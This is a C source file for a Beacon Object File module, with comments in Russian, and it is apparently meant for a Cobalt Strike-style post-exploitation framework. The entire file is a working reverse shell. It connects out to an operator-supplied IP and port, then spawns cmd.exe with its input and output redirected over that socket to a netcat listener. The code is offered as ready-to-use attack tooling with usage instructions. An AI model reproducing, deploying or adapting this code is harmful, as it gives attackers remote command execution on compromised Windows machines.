// bof_reverse_shell.c — reverse shell via BOF.
//
// Создает TCP соединение к указанному IP:PORT и запускает cmd.exe
// с перенаправленными дескрипторами. Работает с netcat listener.
// Преимущество BOF: полный контроль над параметрами подключения.

#include "bof_api.h"

DECLSPEC_IMPORT int WINAPI WS2_32$WSAStartup(WORD wVersionRequested, LPVOID lpWSAData);
DECLSPEC_IMPORT HANDLE WINAPI WS2_32$WSASocketA(int af, int type, int protocol, LPVOID lpProtocolInfo, DWORD g, DWORD dwFlags);
DECLSPEC_IMPORT int WINAPI WS2_32$connect(HANDLE s, const struct sockaddr* name, int namelen);
DECLSPEC_IMPORT int WINAPI WS2_32$closesocket(HANDLE s);
DECLSPEC_IMPORT unsigned long WINAPI WS2_32$inet_addr(const char* cp);
DECLSPEC_IMPORT unsigned short WINAPI WS2_32$htons(unsigned short hostshort);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CreateProcessA(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);

#define AF_INET 2
#define SOCK_STREAM 1
#define IPPROTO_TCP 6
#define MY_INVALID_SOCKET ((HANDLE)~0)
#define MY_SOCKET_ERROR (-1)

// Use system definitions

void go(char* args, int alen) {
    datap parser;
    BeaconDataParse(&parser, args, alen);

    int len;
    char* ip = BeaconDataExtract(&parser, &len);
    int port = BeaconDataInt(&parser);

    if (!ip || len == 0 || port == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "Usage: bof bof_reverse_shell.x64.o <ip> <port>\n");
        BeaconPrintf(CALLBACK_OUTPUT, "Example: bof bof_reverse_shell.x64.o 192.168.1.100 4444\n");
        return;
    }

    // Null-terminate IP string
    char ip_str[32] = {0};
    for (int i = 0; i < len && i < 31; i++) {
        ip_str[i] = ip[i];
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[reverse_shell] Connecting to %s:%d\n", ip_str, port);

    // Initialize Winsock
    char wsaData[400];
    if (WS2_32$WSAStartup(0x0202, wsaData) != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[reverse_shell] WSAStartup failed\n");
        return;
    }

    // Create socket
    HANDLE sock = WS2_32$WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (sock == MY_INVALID_SOCKET) {
        BeaconPrintf(CALLBACK_ERROR, "[reverse_shell] Socket creation failed\n");
        return;
    }

    // Setup target address
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = WS2_32$htons((unsigned short)port);
    addr.sin_addr.s_addr = WS2_32$inet_addr(ip_str);

    // Zero out sin_zero
    for (int i = 0; i < 8; i++) {
        addr.sin_zero[i] = 0;
    }

    // Connect to target
    if (WS2_32$connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == MY_SOCKET_ERROR) {
        BeaconPrintf(CALLBACK_ERROR, "[reverse_shell] Connection failed\n");
        WS2_32$closesocket(sock);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[reverse_shell] Connected! Spawning cmd.exe\n");

    // Setup STARTUPINFOA
    STARTUPINFOA si;
    // Simple memset
    char* p = (char*)&si;
    for (int i = 0; i < sizeof(si); i++) {
        p[i] = 0;
    }

    si.cb = sizeof(STARTUPINFOA);
    si.dwFlags = 0x100; // STARTF_USESTDHANDLES
    si.hStdInput = sock;
    si.hStdOutput = sock;
    si.hStdError = sock;

    // Setup PROCESS_INFORMATION
    PROCESS_INFORMATION pi;
    p = (char*)&pi;
    for (int i = 0; i < sizeof(pi); i++) {
        p[i] = 0;
    }

    // Create cmd.exe process
    char cmd[] = "cmd.exe";
    BOOL result = KERNEL32$CreateProcessA(
        NULL,           // lpApplicationName
        cmd,            // lpCommandLine
        NULL,           // lpProcessAttributes
        NULL,           // lpThreadAttributes
        TRUE,           // bInheritHandles
        0,              // dwCreationFlags
        NULL,           // lpEnvironment
        NULL,           // lpCurrentDirectory
        &si,            // lpStartupInfo
        &pi             // lpProcessInformation
    );

    if (result) {
        BeaconPrintf(CALLBACK_OUTPUT, "[reverse_shell] cmd.exe spawned successfully\n");
        BeaconPrintf(CALLBACK_OUTPUT, "[reverse_shell] Shell should be available on %s:%d\n", ip_str, port);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[reverse_shell] Failed to create process\n");
        WS2_32$closesocket(sock);
    }
}